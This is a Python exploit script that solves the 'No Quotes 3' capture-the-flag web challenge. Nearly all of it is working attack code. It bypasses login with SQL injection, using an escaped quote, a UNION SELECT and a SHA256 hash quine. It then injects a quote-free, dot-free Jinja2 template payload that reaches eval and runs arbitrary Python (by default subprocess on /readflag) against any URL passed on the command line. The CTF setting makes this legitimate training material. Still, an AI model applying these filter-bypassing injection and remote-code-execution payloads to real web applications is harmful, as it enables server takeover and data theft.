#!/usr/bin/env python3
"""
CTF Challenge: No Quotes 3
Solution: SQL Injection + SHA256 Hash Quine + SSTI (no quotes/dots)
"""

import hashlib
import requests
import urllib.parse
import sys

def to_hex(s):
    """Convert string to hex format"""
    return s.encode().hex().upper()

def gen_ssti_payload():
    """
    Generate SSTI payload without quotes or dots.
    Uses dict(key=1)|list|first to generate strings.
    """
    def q(s): 
        return f'dict({s}=1)|list|first'
    
    # Build: config.from_envvar.__globals__.get('__builtins__').get('eval')(request.values.get('code'))
    # Without dots: use |attr() filter
    
    # config|attr('from_envvar')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('eval')(request|attr('values')|attr('get')('code'))
    
    chain = f'config|attr({q("from_envvar")})|attr({q("__globals__")})|attr({q("get")})({q("__builtins__")})'
    evaller = f'{chain}|attr({q("get")})({q("eval")})'
    
    # Get the code from request.values.code
    cmd_arg = f'request|attr({q("values")})|attr({q("get")})({q("code")})'
    
    payload = f'{evaller}({cmd_arg})'
    return '{{' + payload + '}}'

def build_quine_payload():
    """
    Build the SQL hash quine.
    
    The challenge:
    - We need SHA256(password_input) == row[1]
    - row[1] comes from our SQL UNION SELECT
    - We use REPLACE to make the SQL return the exact password we input
    
    Structure:
    password = HEAD + "0x" + HEX(TEMPLATE) + MID + "0x" + HEX(TEMPLATE) + TAIL
    
    SQL: UNION SELECT ssti_hex, SHA2(REPLACE(TEMPLATE, "$", CONCAT("0x", HEX(TEMPLATE))), 256)
    
    The REPLACE reconstructs our password string inside SQL, then SHA2 computes its hash.
    """
    ssti = gen_ssti_payload()
    
    # Username ends with backslash to escape the closing quote
    username_payload = ssti + "\\"
    ssti_hex = "0x" + username_payload.encode().hex()
    
    # Build quine structure
    # The $ is our placeholder that gets replaced with the hex of the template
    head = f") UNION SELECT {ssti_hex}, SHA2(REPLACE("
    mid = ", 0x24, CONCAT(0x3078, HEX("  # 0x24 = '$', 0x3078 = '0x'
    tail = "))), 256) #"
    
    # Template contains $ placeholder
    template = head + "$" + mid + "$" + tail
    t_hex = to_hex(template)
    
    # Final password with hex-encoded template duplicated
    password = head + "0x" + t_hex + mid + "0x" + t_hex + tail
    
    return password, username_payload

def verify_quine(password):
    """Verify that the quine is correctly formed"""
    sha256_hash = hashlib.sha256(password.encode()).hexdigest()
    print(f"[*] Password length: {len(password)}")
    print(f"[*] SHA256 of password: {sha256_hash}")
    return sha256_hash

def exploit(target_url, code):
    """Send exploit to target"""
    password, username = build_quine_payload()
    
    # URL encode the code parameter
    code_encoded = urllib.parse.quote(code)
    full_url = f"{target_url}?code={code_encoded}"
    
    data = {
        "username": username,
        "password": password
    }
    
    print(f"[*] Target: {full_url}")
    print(f"[*] Username (SSTI payload):")
    print(f"    {username[:100]}...")
    print(f"[*] Password (Quine) length: {len(password)}")
    
    # Verify the hash quine locally
    verify_quine(password)
    
    print("\n[*] Sending exploit...")
    
    try:
        # First POST to /login
        session = requests.Session()
        r = session.post(full_url, data=data, allow_redirects=False, timeout=15)
        
        print(f"[*] Login response status: {r.status_code}")
        
        if r.status_code == 302:
            # Redirect means successful login
            print("[+] Login successful, following redirect...")
            home_url = target_url.replace("/login", "/home") + f"?code={code_encoded}"
            r2 = session.get(home_url, timeout=15)
            print(f"[*] Home page status: {r2.status_code}")
            
            # Check for flag
            if "uoftctf" in r2.text:
                print("\n[!!!] FLAG FOUND [!!!]")
                import re
                flag = re.search(r'uoftctf\{[^}]+\}', r2.text)
                if flag:
                    print(f"FLAG: {flag.group(0)}")
                else:
                    # Find uoftctf and print surrounding context
                    idx = r2.text.find("uoftctf")
                    print(f"FLAG: {r2.text[idx:idx+100]}")
            else:
                # Print output around "Welcome"
                if "Welcome," in r2.text:
                    start = r2.text.find("Welcome,")
                    end = r2.text.find("</span>", start)
                    output = r2.text[start:end+7] if end > start else r2.text[start:start+500]
                    print(f"[*] Output:\n{output}")
                else:
                    print(f"[*] Response preview:\n{r2.text[:500]}")
                    
        elif r.status_code == 200:
            # No redirect, check if error or direct success
            if "Invalid credentials" in r.text:
                print("[-] Login failed:")
                # Extract error message
                if "Row:" in r.text:
                    import re
                    match = re.search(r'Row: \([^)]+\)', r.text)
                    if match:
                        print(f"    {match.group(0)}")
                if "Hash:" in r.text:
                    import re
                    match = re.search(r'Hash: [a-f0-9]+', r.text)
                    if match:
                        print(f"    {match.group(0)}")
            elif "uoftctf" in r.text:
                print("\n[!!!] FLAG FOUND [!!!]")
                import re
                flag = re.search(r'uoftctf\{[^}]+\}', r.text)
                if flag:
                    print(f"FLAG: {flag.group(0)}")
            else:
                print(f"[*] Response preview:\n{r.text[:500]}")
        else:
            print(f"[?] Unexpected status: {r.status_code}")
            print(f"[*] Response:\n{r.text[:500]}")
            
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    # Default: local testing
    local_url = "http://localhost:5001/login"
    remote_url = "https://no-quotes-3-ac3ea00f532b3565.chals.uoftctf.org/login"
    
    # Code to execute - run /readflag and return output
    code = "__import__('subprocess').check_output(['/readflag'])"
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "remote":
            target = remote_url
        elif sys.argv[1] == "local":
            target = local_url
        else:
            target = sys.argv[1]
    else:
        target = local_url
    
    if len(sys.argv) > 2:
        code = sys.argv[2]
    
    print("=" * 60)
    print("No Quotes 3 - CTF Exploit")
    print("=" * 60)
    print()
    
    exploit(target, code)

if __name__ == "__main__":
    main()
